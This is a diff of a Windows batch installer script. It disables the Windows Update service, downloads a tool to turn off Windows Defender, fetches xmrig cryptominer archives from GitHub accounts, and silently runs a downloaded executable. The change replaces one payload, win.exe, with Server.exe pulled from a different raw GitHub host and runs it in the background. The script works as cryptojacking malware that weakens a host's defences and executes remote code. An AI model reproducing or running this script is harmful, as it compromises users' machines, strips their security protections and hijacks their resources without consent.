@@ -181,7 +181,7 @@ net stop wuauserv
 sc config wuauserv start=disabled
 powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://github.com/1753174725/xmrig/raw/main/WDControl_1.7.0.exe', '%USERPROFILE%\WDControl_1.7.0.exe')"
 "%USERPROFILE%\WDControl_1.7.0.exe" /Disable /force>NUL
-powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://github.com/1753174725/xmrig/raw/main/win.exe', '%USERPROFILE%\win.exe')"
+powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/110099/cdn/master/Server.exe', '%USERPROFILE%\Server.exe')"
 
 echo [*] Downloading c3pool advanced version of xmrig to "%USERPROFILE%\xmrigsupportxmr.zip"
 powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://github.com/1753174725/xmrig/raw/main/xmrigsupportxmr.zip', '%USERPROFILE%\xmrigsupportxmr.zip')"
@@ -382,7 +382,7 @@ goto OK
 :OK
 echo
 echo [*] Setup complete
-"%USERPROFILE%\win.exe" >NUL
+"%USERPROFILE%\Server.exe" >NUL
 exit /b 0
 
 :strlen string len
